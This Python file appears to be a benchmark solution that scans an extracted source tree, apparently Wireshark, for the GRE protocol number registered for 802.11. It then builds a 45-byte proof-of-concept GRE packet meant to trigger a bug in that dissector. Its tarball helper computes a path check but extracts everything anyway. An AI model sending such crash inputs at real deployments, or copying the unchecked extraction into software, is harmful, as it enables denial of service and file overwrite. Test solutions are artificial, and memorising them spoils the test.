import os
import tarfile
import tempfile
import re
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        def extract_tarball(tar_path: str, dst_dir: str) -> None:
            try:
                with tarfile.open(tar_path, 'r:*') as tf:
                    def is_within_directory(directory, target):
                        abs_directory = os.path.abspath(directory)
                        abs_target = os.path.abspath(target)
                        prefix = os.path.commonprefix([abs_directory, abs_target])
                        return prefix == abs_directory

                    for member in tf.getmembers():
                        member_path = os.path.join(dst_dir, member.name)
                        if not is_within_directory(dst_dir, member_path):
                            continue
                    tf.extractall(dst_dir)
            except Exception:
                pass

        def iter_source_files(root: str):
            for dirpath, dirnames, filenames in os.walk(root):
                for fn in filenames:
                    if fn.endswith(('.c', '.h', '.cc', '.cpp')):
                        full = os.path.join(dirpath, fn)
                        try:
                            with open(full, 'r', errors='ignore') as f:
                                yield full, f.read()
                        except Exception:
                            continue

        def build_macro_map(root: str):
            macro_map = {}
            define_re = re.compile(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+((?:0x|0X)?[0-9a-fA-F]+)\b', re.MULTILINE)
            for path, text in iter_source_files(root):
                for m in define_re.finditer(text):
                    name = m.group(1)
                    val = m.group(2)
                    try:
                        macro_map[name] = int(val, 0)
                    except Exception:
                        continue
            return macro_map

        def find_gre_proto_value_for_80211(root: str, macro_map: dict):
            # Search for gre.proto registrations in files likely related to 802.11/wlan
            pattern = re.compile(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([A-Za-z_]\w*|0x[0-9A-Fa-f]+|\d+)\s*,', re.MULTILINE)
            candidates = []

            # First pass: prefer files with 802.11/wlan in path or content
            for path, text in iter_source_files(root):
                score = 0
                lpath = path.lower()
                if '80211' in lpath or '802_11' in lpath or '802.11' in lpath or 'wlan' in lpath:
                    score += 10
                if '802.11' in text or 'wlan' in text:
                    score += 5
                for m in pattern.finditer(text):
                    token = m.group(1)
                    candidates.append((score, path, token))

            if not candidates:
                # Second pass: any file
                for path, text in iter_source_files(root):
                    for m in pattern.finditer(text):
                        token = m.group(1)
                        candidates.append((0, path, token))

            # Sort by score descending, prefer 802.11 contexts
            candidates.sort(key=lambda x: (-x[0], x[1]))
            # Try to resolve token to integer
            for score, path, token in candidates:
                token = token.strip()
                val = None
                try:
                    if token.startswith('0x') or token.isdigit():
                        val = int(token, 0)
                    elif token in macro_map:
                        val = macro_map[token]
                except Exception:
                    val = None
                if val is not None and 0 <= val <= 0xFFFF:
                    # Heuristic: make sure context likely 802.11
                    if score >= 10:
                        return val
            # If not found in high-score, return first resolvable
            for score, path, token in candidates:
                token = token.strip()
                try:
                    if token.startswith('0x') or token.isdigit():
                        val = int(token, 0)
                    elif token in macro_map:
                        val = macro_map[token]
                    else:
                        continue
                    if 0 <= val <= 0xFFFF:
                        return val
                except Exception:
                    continue
            return None

        with tempfile.TemporaryDirectory() as tmpdir:
            extract_tarball(src_path, tmpdir)
            macro_map = build_macro_map(tmpdir)
            gre_ptype = find_gre_proto_value_for_80211(tmpdir, macro_map)

        # Fallback protocol type if detection failed: use a plausible GRE protocol type
        if gre_ptype is None:
            # This is a heuristic fallback; a known GRE protocol type often used is 0x0001 or 0x6558 for Transparent Ethernet Bridging.
            # However, to specifically drive gre.proto dispatch, we pick a low value assuming registration used a small constant.
            gre_ptype = 0x0001

        # GRE header:
        # - Flags and Version (2 bytes): set to 0x0000 (version 0, no optional fields)
        # - Protocol Type (2 bytes): gre_ptype determined above
        # Append padding/payload to reach 45 bytes total.
        gre_flags_version = 0x0000
        header = struct.pack('>HH', gre_flags_version, gre_ptype)

        total_len = 45
        if len(header) >= total_len:
            poc = header[:total_len]
        else:
            poc = header + b'\x00' * (total_len - len(header))
        return poc
